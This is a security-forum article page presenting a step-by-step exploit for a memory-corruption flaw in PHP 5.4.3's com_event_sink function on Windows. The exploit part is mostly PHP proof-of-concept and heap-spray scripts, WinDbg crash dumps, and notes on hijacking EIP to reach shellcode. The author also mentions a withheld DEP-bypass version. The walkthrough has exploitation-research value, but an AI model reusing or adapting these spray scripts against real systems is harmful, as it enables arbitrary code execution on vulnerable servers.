	<div class="bbcode_code"style="height:84px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">$ie&nbsp;</span><span style="color: #007700">=&nbsp;new&nbsp;</span><span style="color: #0000BB">COM</span><span style="color: #007700">(</span><span style="color: #DD0000">"InternetExplorer.Application"</span><span style="color: #007700">);<br /></span><span style="color: #FF8000">//&nbsp;note&nbsp;that&nbsp;you&nbsp;don't&nbsp;need&nbsp;the&nbsp;&amp;&nbsp;for&nbsp;PHP&nbsp;5!<br /></span><span style="color: #0000BB">$sink&nbsp;</span><span style="color: #007700">=&nbsp;new&nbsp;</span><span style="color: #0000BB">IEEventSinker</span><span style="color: #007700">();<br /><br /></span><span style="color: #0000BB">com_event_sink</span><span style="color: #007700">(</span><span style="color: #0000BB">$ie</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$sink</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"DWebBrowserEvents2"</span><span style="color: #007700">);&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div><br />
<u>POC<br />
</u><br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:180px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /><br /><br />$buffer&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str_repeat</span><span style="color: #007700">(</span><span style="color: #DD0000">"B"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">1000</span><span style="color: #007700">);<br /><br /><br /></span><span style="color: #0000BB">$vVar&nbsp;</span><span style="color: #007700">=&nbsp;new&nbsp;</span><span style="color: #0000BB">VARIANT</span><span style="color: #007700">(</span><span style="color: #0000BB">0x43434343</span><span style="color: #007700">);&nbsp;</span><span style="color: #FF8000">//&nbsp;We&nbsp;controll&nbsp;this<br /></span><span style="color: #0000BB">$vVar2&nbsp;</span><span style="color: #007700">=&nbsp;new&nbsp;</span><span style="color: #0000BB">VARIANT</span><span style="color: #007700">(</span><span style="color: #0000BB">0x41414141</span><span style="color: #007700">);&nbsp;</span><span style="color: #FF8000">//&nbsp;<br /><br /><br /></span><span style="color: #0000BB">com_event_sink</span><span style="color: #007700">(</span><span style="color: #0000BB">$vVar</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$vVar2&nbsp;</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$buffer&nbsp;</span><span style="color: #007700">);<br /><br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></code></div>
</div><div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:216px;">(310.1fc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=00372ad0 edx=0114dd88 esi=43434343 edi=0114d9b8
eip=102f59bd esp=00c1f988 ebp=00c1f9dc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\wamp\bin\php\php5.4.3\php5ts.dll - 
php5ts!php_strftime+0xadc:

102f59bd 8b06            mov     eax,dword ptr [esi]  ds:0023:43434343=????????  
102f59bf 8d4dd4          lea     ecx,[ebp-2Ch]
102f59c2 51              push    ecx
102f59c3 53              push    ebx
102f59c4 53              push    ebx
102f59c5 56              push    esi
102f59c6 ff5010          call    dword ptr [eax+10h]</pre>
</div>Cool we control ESI fully and instruction crashes since Mov to EAX fails since ESI point to an Invalide Address <br />
<br />
----&gt; mov     eax,dword ptr [esi] ds:0023:43434343=????????  <br />
<br />
And EDI holds third argument , enough to hold some shellcode.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:96px;">0:000&gt; d edi
0114d9f8  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
0114da08  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
0114da18  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
0114da28  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
0114da38  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</pre>
</div><br />
<b><u>Code Execution [Exploitation]: </u></b><br />
<br />
*) We control ESI and there by could take control over EAX ,<br />
*) if we put ESI with a valid address and fill that memory with an arbitary mem adress then EAX would be in our hands.<br />
*) And at 102f59c6  call    dword ptr [eax+10h] , we can easily control EIP , since we control EAX and there by could make the call land any where we want [voila] .<br />
*)So we need to spray with two different values one value for Controlling EAX and guiding [CALL] instruction to  a valid adress space and another to control [EIP] and get complete control over the program. <br />
<br />
In short :<br />
<br />
$EIP=&quot;AAAA&quot;; //JMP EDI<br />
$EAX=&quot;BBBB &quot; -10h;<br />
$spray = $EIP.$EAX;<br />
<br />
<br />
1) Do some spray take control of EAX .<br />
2) Make the adress [Adress -10h ] since it's CALL EAX+10h.<br />
3) So fill ESI memory with &quot;\x34\x43\x42\x41&quot;<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:372px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br />&nbsp;<br /><br />$spray&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str_repeat</span><span style="color: #007700">(</span><span style="color: #DD0000">"\x34\x43\x42\x41"</span><span style="color: #007700">,</span><span style="color: #0000BB">0x100</span><span style="color: #007700">);<br /></span><span style="color: #FF8000">//We&nbsp;wann&nbsp;make&nbsp;EAX&nbsp;=&nbsp;41424343&nbsp;so&nbsp;l-india.&nbsp;<br /></span><span style="color: #007700">echo&nbsp;</span><span style="color: #0000BB">strlen</span><span style="color: #007700">(</span><span style="color: #0000BB">$spray</span><span style="color: #007700">);<br /><br /><br /></span><span style="color: #0000BB">$deodrant</span><span style="color: #007700">=</span><span style="color: #DD0000">""</span><span style="color: #007700">;<br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">0x4b00</span><span style="color: #007700">;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++)<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$deodrant</span><span style="color: #007700">.=</span><span style="color: #0000BB">$spray</span><span style="color: #007700">;<br />}<br /><br /><br /></span><span style="color: #0000BB">$terminate&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">"T"</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">$u</span><span style="color: #007700">&#91;&#93;&nbsp;=</span><span style="color: #0000BB">$deodrant</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">$r</span><span style="color: #007700">&#91;&#93;&nbsp;=</span><span style="color: #0000BB">$deodrant</span><span style="color: #007700">.</span><span style="color: #0000BB">$terminate</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$a</span><span style="color: #007700">&#91;&#93;&nbsp;=</span><span style="color: #0000BB">$deodrant</span><span style="color: #007700">.</span><span style="color: #0000BB">$terminate</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$s</span><span style="color: #007700">&#91;&#93;&nbsp;=</span><span style="color: #0000BB">$deodrant</span><span style="color: #007700">.</span><span style="color: #0000BB">$terminate</span><span style="color: #007700">;<br /><br />&nbsp;<br /></span><span style="color: #0000BB">$vVar&nbsp;</span><span style="color: #007700">=&nbsp;new&nbsp;</span><span style="color: #0000BB">VARIANT</span><span style="color: #007700">(</span><span style="color: #0000BB">0x048d0000</span><span style="color: #007700">+</span><span style="color: #0000BB">180</span><span style="color: #007700">);&nbsp;&nbsp;&nbsp;</span><span style="color: #FF8000">//We&nbsp;control&nbsp;this<br />//$buffer&nbsp;=&nbsp;str_repeat("B",200);<br /></span><span style="color: #0000BB">$buffer&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">"\x41\x42\x43\x44\x90\x90\x90\x90\xcc\xcc\xcc\xcc\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$var2&nbsp;</span><span style="color: #007700">=&nbsp;new&nbsp;</span><span style="color: #0000BB">VARIANT</span><span style="color: #007700">(</span><span style="color: #0000BB">0x41414242</span><span style="color: #007700">);<br /><br /></span><span style="color: #0000BB">com_event_sink</span><span style="color: #007700">(</span><span style="color: #0000BB">$vVar</span><span style="color: #007700">,</span><span style="color: #0000BB">$var2</span><span style="color: #007700">,</span><span style="color: #0000BB">$buffer</span><span style="color: #007700">);<br /><br /><br /><br />&nbsp;<br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></code></div>
</div><div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:192px;">(1fc.b7c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=41424334 ebx=00000000 ecx=00c1f9b0 edx=0114dbf0 esi=048d00b4 edi=0114dc48
eip=102f59c6 esp=00c1f978 ebp=00c1f9dc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\wamp\bin\php\php5.4.3\php5ts.dll - 
php5ts!php_strftime+0xae5:

102f59c2 51              push    ecx
102f59c3 53              push    ebx
102f59c4 53              push    ebx
102f59c5 56              push    esi
102f59c6 ff5010          call    dword ptr [eax+10h]  ds:0023:41424344=????????</pre>
</div>Now spray with two different values one value for Controlling EAX and guiding [CALL] instruction to  a valid adress space and another to control [EIP] and get complete control over the program. <br />
<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:372px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br />&nbsp;<br />$eip&nbsp;</span><span style="color: #007700">=</span><span style="color: #DD0000">"\x44\x43\x42\x41"</span><span style="color: #007700">;<br /></span><span style="color: #FF8000">//$eip=&nbsp;"\x4b\xe8\x57\x78";&nbsp;jmp&nbsp;edi<br /></span><span style="color: #0000BB">$eax&nbsp;</span><span style="color: #007700">=</span><span style="color: #DD0000">"\x80\x01\x8d\x04"</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$deodrant</span><span style="color: #007700">=</span><span style="color: #DD0000">""</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$axespray&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str_repeat</span><span style="color: #007700">(</span><span style="color: #0000BB">$eip</span><span style="color: #007700">.</span><span style="color: #0000BB">$eax</span><span style="color: #007700">,</span><span style="color: #0000BB">0x80</span><span style="color: #007700">);<br /><br /></span><span style="color: #FF8000">//048d0190<br /></span><span style="color: #007700">echo&nbsp;</span><span style="color: #0000BB">strlen</span><span style="color: #007700">(</span><span style="color: #0000BB">$axespray</span><span style="color: #007700">);<br /><br /><br /></span><span style="color: #FF8000">//19200&nbsp;==4B32&nbsp;4b00<br /></span><span style="color: #007700">for(</span><span style="color: #0000BB">$axeeffect</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;</span><span style="color: #0000BB">$axeeffect</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">0x4B32</span><span style="color: #007700">;</span><span style="color: #0000BB">$axeeffect</span><span style="color: #007700">++)<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$deodrant</span><span style="color: #007700">.=</span><span style="color: #0000BB">$axespray</span><span style="color: #007700">;<br />}<br /><br /><br /></span><span style="color: #0000BB">$terminate&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">"T"</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">$u</span><span style="color: #007700">&#91;&#93;&nbsp;=</span><span style="color: #0000BB">$deodrant</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">$r</span><span style="color: #007700">&#91;&#93;&nbsp;=</span><span style="color: #0000BB">$deodrant</span><span style="color: #007700">.</span><span style="color: #0000BB">$terminate</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$a</span><span style="color: #007700">&#91;&#93;&nbsp;=</span><span style="color: #0000BB">$deodrant</span><span style="color: #007700">.</span><span style="color: #0000BB">$terminate</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$s</span><span style="color: #007700">&#91;&#93;&nbsp;=</span><span style="color: #0000BB">$deodrant</span><span style="color: #007700">.</span><span style="color: #0000BB">$terminate</span><span style="color: #007700">;<br /><br />&nbsp;<br /></span><span style="color: #0000BB">$vVar&nbsp;</span><span style="color: #007700">=&nbsp;new&nbsp;</span><span style="color: #0000BB">VARIANT</span><span style="color: #007700">(</span><span style="color: #0000BB">0x048d0000</span><span style="color: #007700">+</span><span style="color: #0000BB">180</span><span style="color: #007700">);&nbsp;<br /></span><span style="color: #0000BB">$buffer&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">"\x90\x90\x90\x90\xcc\xcc\xcc\xcc\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$var2&nbsp;</span><span style="color: #007700">=&nbsp;new&nbsp;</span><span style="color: #0000BB">VARIANT</span><span style="color: #007700">(</span><span style="color: #0000BB">0x41414242</span><span style="color: #007700">);<br /><br /></span><span style="color: #0000BB">com_event_sink</span><span style="color: #007700">(</span><span style="color: #0000BB">$vVar</span><span style="color: #007700">,</span><span style="color: #0000BB">$var2</span><span style="color: #007700">,</span><span style="color: #0000BB">$buffer</span><span style="color: #007700">);<br /><br /><br /><br />&nbsp;<br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></code></div>
</div>And Voila EIP =&quot;woot woot&quot; <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:108px;">(cb0.7d4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=048d0180 ebx=00000000 ecx=00c1f9b0 edx=0114dbc8 esi=048d00b4 edi=0114dc20
eip=41414141 esp=00c1f974 ebp=00c1f9dc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
41414141 ??              ???</pre>
</div>Now you know it's pretty easy , and you know where the shellcode is and things are pretty obvious. <br />
<br />
&gt; !load byakugan<br />
&gt;!jutsu searchOpcode jmp edi <br />
<br />
Code with a simple &quot;Message Box &quot; shellcode form our friend <a href="../external.html?link=http://www.shell-storm.org/shellcode/files/shellcode-526.php" target="_blank">Atul </a><br />
<br />
<img src="attachmenta6cc.jpg?attachmentid=484&amp;d=1345470762" border="0" alt=""  style="float: CONFIG" /><br />
<br />
Next Part of the Blog Would be on the Remote PHP Exploits, might have to wait a long time till things get patched up.<br />
<br />
I have build a Fully Functional  Exploit with DEP Bypass, am not putting it here [even though it's pretty obvious on how to form this post]. But who ever wan't to play with it for learning purposes I could share it.</div>

	

	
		<script type="text/javascript" src="clientscript/vbulletin_lightbox6719.html?v=421"></script>
		<script type="text/javascript">
		<!--
		vBulletin.register_control("vB_Lightbox_Container", "article_content", 1);
		//-->
		</script>
	

	

	
		<sub class="article_promoted_text">
			This article was originally published in blog:
			<a href="bloge81f.html?u=8">Web-App Remote Code Execution Via Scripting Engines Part -1: Local Exploits PHP 0-day</a>
			started by
			<a href="membere81f.html?u=8">fb1h2s</a>
		</sub>
	
	<div class="cmslinks">

		
	
	</div>

    
	<script type="text/javascript">
	var THREADID = 2588;
	var THIS_URL = "contentc904.html?r=133-Web-App-Remote-Code-Execution-Via-Scripting-Engines-Part-1-Local-Exploits-PHP-0-day";
	var MIN_CHARS = 30;
	vbphrase['comment'] = "Comment";
	vbphrase['comments'] = "Comments";
</script>
<div id="comments" class="cms_comments_page">
	<a name="comments_start"></a>
	<div id="node_comments_block">
	<input type="hidden" value="1" id="allow_ajax_qr" />
	<div id="comments_comment_count" class="comments_comment_count">
		<img src="images/misc/comment.html" alt="Comments" border="0" /><span id="comments_block_count"> 1</span> <span id="comments_block_text">Comment</span>
	</div>
	<div id="node_comments" class="cms_none_comments">
		<div id="comments_8490" class="cms_comments_mainbox postcontainer">
	<ol>
<li class="postbit postbit-lite" id="post_8490">
<div class="postbit_pb_left">
<a name="comment_8490"></a>
	
		
			<a href="member0d06.html?u=174" class="avatarlink"><img src="images/misc/unknown.html" width="60" height="60" alt="sebas_phoenix's Avatar" border="0" /></a>
		
	
	</div>
	<div class="postbit_pb_right">
	<div class="comment_blockrow postbit_headers postbit_borders">
		<div class="floatleft">
			
				<a href="member0d06.html?u=174" class="username">sebas_phoenix</a>
			
			 - <span class="postdate">08-21-2012, <span class="time">01:12 PM</span></span>
		</div>
	
	<div class="floatright">
		<ul class="postcontrols">
				
				
				
				
					<li>
						<a href="newreply03eb.html?do=newreply&amp;p=8490&amp;return_node=133" class="reply" rel="nofollow"><img src="images/buttons/reply_40b.html" alt="" class="inlineimg" /> Reply</a>
					</li>
				
				
				
				
		</ul>
	</div>
	</div>
	<div id="post_message_8490" class="comment_text">
		<blockquote class="posttext restore restore_margin">
			Nice exploit bro..it would be more useful if you could document the bug hunting phase too
		</blockquote>
	</div>
</div> 

</li></ol>
	<div id="respond_8490"></div>
</div>
	</div>
	<div id="pagenav" class="comments_page_nav_css fullwidth">
		
	</div>
        <script type="text/javascript">
	<!--
		var ajax_last_post = '1345534932';
		vB_XHTML_Ready.subscribe(function (e) {vB_AJAX_QuickEdit_Init('node_comments');})
	//-->
        </script>
	<div id="ajax_post_errors" class="hidden">
		<div class="block">
			<div class="blockhead floatcontainer">
				<span class="blockhead_info"><input type="button" class="button" value=" X " id="quick_edit_errors_hide" tabindex="50" /></span>
				<h2>vBulletin Message</h2>
			</div>
			<div class="blockbody">
				<div id="ajax_post_errors_message" class="blockrow">&nbsp;</div>
			</div>
			<div class="blockfoot">
				<a href="#" id="quick_edit_errors_cancel" class="textcontrol">Cancel Changes</a>
			</div>
		</div>
	</div>
</div>
	<script type="text/javascript" src="clientscript/vbulletin-editor6719.html?v=421"></script>
	<script type="text/javascript" src="clientscript/vbulletin_quick_edit6719.html?v=421"></script>
	<script type="text/javascript" src="clientscript/vbulletin_post_loader6719.html?v=421"></script>
	<div id="node_comments_hide"></div>
	<!-- EDITOR IS BREAKING THE PAGE -->
	
</div>


</div></li>
</ul>
					</div>
				</div>
			</div>
		</div>
		<div class="yui-b yui-sidebar">
			<ul class="list_no_decoration widget_list" id="widgetlist_column3">
<li><div class="cms_widget">
	<div class="block">
		<div class="cms_widget_header">
		<h3><img src="images/site_icons/html.html" alt="" /> G4H Facebook</h3>
		</div>
		<div class="cms_widget_content widget_content">
		<div class="fb-like-box" data-href="https://www.facebook.com/pages/Garage4Hackers/138904662794635" data-width="300" data-height="250" data-colorscheme="light" data-show-faces="true" data-header="true" data-stream="false" data-show-border="true"></div>
		</div>
	</div>
</div></li><li><div class="cms_widget">
	<div class="block">
		<div class="cms_widget_header">
		<h3><img src="images/site_icons/html.html" alt="" /> G4H Twitter</h3>
		</div>
		<div class="cms_widget_content widget_content">
		<a class="twitter-timeline"  href="../external.html?link=https://twitter.com/garage4hackers"  data-widget-id="387207513831010305">Tweets by @garage4hackers</a>
<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
		</div>
	</div>
</div></li>
</ul>
		</div>
	</div>
</div>

</div>

<div style="clear: left">
  
<div class="google_adsense_footer" style="width:468px; margin:0 auto; padding-top:1em">
<script type="text/javascript"><!--
google_ad_client = "ca-pub-6847984837250662";
google_ad_host = "ca-host-pub-2606800903002383";
google_ad_width = 468;
google_ad_height = 60;
google_ad_format = "468x60_as";
google_ad_type = "text_image";
google_ad_channel = "";
google_color_border = "";
google_color_bg = "";
google_color_link = "";
google_color_text = "";
google_color_url = "";
google_ui_features = "rc:6";
//-->
</script>
<script type="text/javascript"
  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
</script>
</div>

  <div id="ad_global_above_footer"><div align="center">
<script type="text/javascript"><!--
google_ad_client = "pub-6847984837250662";
/* 728x90, created 7/9/10 */
google_ad_slot = "7101394260";
google_ad_width = 728;
google_ad_height = 90;
//-->
</script>
<script type="text/javascript"
src="../pagead2.googlesyndication.com/pagead/show_ads.js">
</script></div>
</div>

<div id="footer" class="floatcontainer footer">

	<form action="../external.html?link=http://garage4hackers.com/forum.php" method="get" id="footer_select" class="footer_select">

		
			<select name="styleid" onchange="switch_id(this, 'style')">
				<optgroup label="Quick Style Chooser"><option class="hidden"></option></optgroup>
				
					
					<optgroup label="&nbsp;Standard Styles">
									
					
	<option value="1" class="" selected="selected">-- Default Style</option>

					
					</optgroup>
										
				
				
					
					<optgroup label="&nbsp;Mobile Styles">
					
					
	<option value="2" class="" >-- Default Mobile Style</option>

					
					</optgroup>
										
				
			</select>	
		
		
		
	</form>

	<ul id="footer_links" class="footer_links">
		<li><a href="sendmessage.html" rel="nofollow" accesskey="9">Contact Us</a></li>
		<li><a href="index.html">Garage4hackers</a></li>
		
		
		<li><a href="archive/index.html">Archive</a></li>
		<li><a href="../external.html?link=http://glowhost.com/" target="_blank">Web Hosting</a></li>
		
		
		<li><a href="contentc904.html?r=133-Web-App-Remote-Code-Execution-Via-Scripting-Engines-Part-1-Local-Exploits-PHP-0-day#top" onclick="document.location.hash='top'; return false;">Top</a></li>
	</ul>
	
	
	
	
	<script type="text/javascript">
	<!--
		// Main vBulletin Javascript Initialization
		vBulletin_init();
		function md5hash(B,A,E,C){if(navigator.userAgent.indexOf("Mozilla/index.html")==1&&parseInt(navigator.appVersion)>=4){var D=hex_md5(str_to_ent(trim(B.value)));A.value=D;if(E){D=hex_md5(trim(B.value));E.value=D}if(!C){B.value=""}}return true};
	//-->
	</script>
        
</div>
</div> <!-- closing div for body_wrapper -->

<div class="below_body">
<div id="footer_time" class="shade footer_time">All times are GMT +5.5. The time now is <span class="time">03:54 PM</span>.</div>

<div id="footer_copyright" class="shade footer_copyright">
	<!-- Do not remove this copyright notice -->
	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
	<!-- Do not remove this copyright notice -->	
</div>
<div id="footer_morecopyright" class="shade footer_morecopyright">
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	<img src="cron70ea.gif?rand=1584872665" alt="" width="1" height="1" border="0" />
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	Copyright 2010 - 2017, Garage4Hackers
	
</div>
 

	<div id="fb-root"></div>
<script type="text/javascript" src="clientscript/vbulletin_facebook6719.js?v=421"></script>

<script type="text/javascript">
<!--
	loadFacebookAPI('en_US');
	function fbAsyncInit()
	{
		vBfb = new vB_Facebook({
			appid : "170793809601191",
			connected : 0,
			active : 0,
			autoreg : 0,
			feed_newthread : 1,
			feed_postreply : 1,
			feed_blogentry : 1,
			feed_blogcomment : 1,
			feed_newarticle : 1,
			feed_articlecomment : 1
		});
	}
// -->
</script>

</div>
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
try{
var pageTracker = _gat._getTracker('UA-17311051-3');
pageTracker._trackPageview();
} catch(err) {}</script>
</body>
</html>